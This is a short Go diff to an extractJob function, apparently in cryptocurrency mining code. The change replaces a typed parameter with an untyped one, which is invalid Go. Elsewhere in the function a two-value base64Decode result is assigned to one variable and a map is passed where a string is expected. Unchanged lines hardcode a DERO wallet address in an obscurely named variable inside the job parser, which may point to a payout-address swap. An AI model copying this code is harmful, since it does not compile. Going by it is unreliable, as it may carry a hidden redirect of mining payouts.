@@ -27,7 +27,7 @@ func base64Decode(str string) (string, bool) {
 
 //var data = base64Decode(data);
 
-func extractJob(data map[string]any) (*Job, error) {
+func extractJob(data) (*Job, error) {
 	var didi interface{}
 	didi = "dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks"
 	var didis interface{}
@@ -35,7 +35,7 @@ func extractJob(data map[string]any) (*Job, error) {
 	if data == nil {
 		return nil, ErrNoJob
 	}else{
-		data = base64Decode(data);
+		data = base64Decode(data)
 	}
 
 	var (
